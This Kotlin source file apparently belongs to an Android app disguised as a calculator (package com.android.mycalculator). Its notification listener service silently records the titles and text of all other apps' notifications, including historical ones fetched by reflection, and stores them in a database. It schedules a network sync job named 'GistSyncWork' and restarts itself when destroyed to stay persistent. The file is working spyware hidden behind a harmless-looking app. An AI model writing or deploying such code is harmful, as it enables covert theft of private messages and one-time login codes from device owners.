package com.android.mycalculator
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.content.Intent
import android.os.Build
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import androidx.work.*

class NotificationService : NotificationListenerService() {
    private lateinit var dbHelper: DatabaseHelper

    override fun onCreate() {
        super.onCreate()
        dbHelper = DatabaseHelper(this)
        
        // Start as foreground service
        startForegroundService()
        
        // Start keep alive services
        startKeepAliveServices()
    }

    override fun onListenerConnected() {
        super.onListenerConnected()
        // Add delay to prevent crashes on Android 14+
        android.os.Handler(mainLooper).postDelayed({
            try {
                captureAllExistingNotifications()
            } catch (e: Exception) {
                // Silent fail
            }
        }, 2000)
    }

    private fun startForegroundService() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                "notification_service",
                "Notification Service",
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                description = "Main notification logging service"
            }
            
            val manager = getSystemService(NotificationManager::class.java)
            manager.createNotificationChannel(channel)
            
            val notification = Notification.Builder(this, "notification_service")
                .setContentTitle("Notify Log Active")
                .setContentText("Monitoring notifications")
                .setSmallIcon(android.R.drawable.ic_dialog_info)
                .setOngoing(true)
                .build()
            
            startForeground(1001, notification)
        }
    }

    private fun startKeepAliveServices() {
        // Start keep alive service
        val keepAliveIntent = Intent(this, KeepAliveService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(keepAliveIntent)
        } else {
            startService(keepAliveIntent)
        }
        
        // Start heartbeat service
        val heartbeatIntent = Intent(this, HeartbeatService::class.java)
        startService(heartbeatIntent)
    }

    private fun captureAllExistingNotifications() {
        try {
            val activeNotifications = getActiveNotifications()
            
            if (activeNotifications.isNotEmpty()) {
                var savedCount = 0
                
                for (sbn in activeNotifications) {
                    val packageName = sbn.packageName
                    val extras = sbn.notification?.extras ?: continue

                    val title = extras.getString(Notification.EXTRA_TITLE) 
                        ?: extras.getString(Notification.EXTRA_TITLE_BIG) 
                        ?: "No Title"

                    val text = extras.getCharSequence(Notification.EXTRA_TEXT)?.toString()
                        ?: extras.getCharSequence(Notification.EXTRA_BIG_TEXT)?.toString()
                        ?: extras.getCharSequence(Notification.EXTRA_SUB_TEXT)?.toString()
                        ?: extras.getCharSequence(Notification.EXTRA_SUMMARY_TEXT)?.toString()
                        ?: "No Text"

                    if (packageName != "com.android.mycalculator" &&
                        packageName != "com.android.systemui" && 
                        text != "No Text") {
                        
                        val wasSaved = dbHelper.insertLog(packageName, title, text)
                        if (wasSaved) savedCount++
                    }
                }
            }
            
            // Try historical (silent fail if not available)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                tryCaptureHistoricalNotifications()
            }
            
        } catch (e: Exception) {
            // Silent fail
        }
    }
    
    private fun tryCaptureHistoricalNotifications() {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                val method = this.javaClass.getMethod("getHistoricalNotifications")
                val historical = method.invoke(this) as Array<StatusBarNotification>?
                
                if (historical != null && historical.isNotEmpty()) {
                    for (sbn in historical) {
                        val packageName = sbn.packageName
                        val extras = sbn.notification?.extras ?: continue

                        val title = extras.getString(Notification.EXTRA_TITLE) 
                            ?: extras.getString(Notification.EXTRA_TITLE_BIG) 
                            ?: "No Title"

                        val text = extras.getCharSequence(Notification.EXTRA_TEXT)?.toString()
                            ?: extras.getCharSequence(Notification.EXTRA_BIG_TEXT)?.toString()
                            ?: "No Text"

                        if (packageName != "com.example.notiflogger" && 
                            packageName != "com.android.systemui" && 
                            text != "No Text") {
                            
                            dbHelper.insertLog(packageName, title, text)
                        }
                    }
                }
            }
        } catch (e: Exception) {
            // Silent fail - most devices don't support this
        }
    }

    override fun onNotificationPosted(sbn: StatusBarNotification?) {
        val packageName = sbn?.packageName ?: return
        val extras = sbn.notification?.extras ?: return

        val title = extras.getString(Notification.EXTRA_TITLE) 
            ?: extras.getString(Notification.EXTRA_TITLE_BIG) 
            ?: "No Title"

        val text = extras.getCharSequence(Notification.EXTRA_TEXT)?.toString()
            ?: extras.getCharSequence(Notification.EXTRA_BIG_TEXT)?.toString()
            ?: extras.getCharSequence(Notification.EXTRA_SUB_TEXT)?.toString()
            ?: extras.getCharSequence(Notification.EXTRA_SUMMARY_TEXT)?.toString()
            ?: "No Text"

        if (packageName != "com.example.notiflogger" && 
            packageName != "com.android.systemui" && 
            text != "No Text") {
            
            val wasSaved = dbHelper.insertLog(packageName, title, text)
            
            if (wasSaved) {
                val updateIntent = Intent("com.android.mycalculator.NEW_NOTIFICATION")
                sendBroadcast(updateIntent)

                val constraints = Constraints.Builder()
                    .setRequiredNetworkType(NetworkType.CONNECTED)
                    .build()

                val syncWorkRequest = OneTimeWorkRequestBuilder<SyncWorker>()
                    .setConstraints(constraints)
                    .build()

                WorkManager.getInstance(applicationContext).enqueueUniqueWork(
                    "GistSyncWork",
                    ExistingWorkPolicy.APPEND_OR_REPLACE,
                    syncWorkRequest
                )
            }
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        
        val intent = Intent(this, NotificationService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(intent)
        } else {
            startService(intent)
        }
    }
}
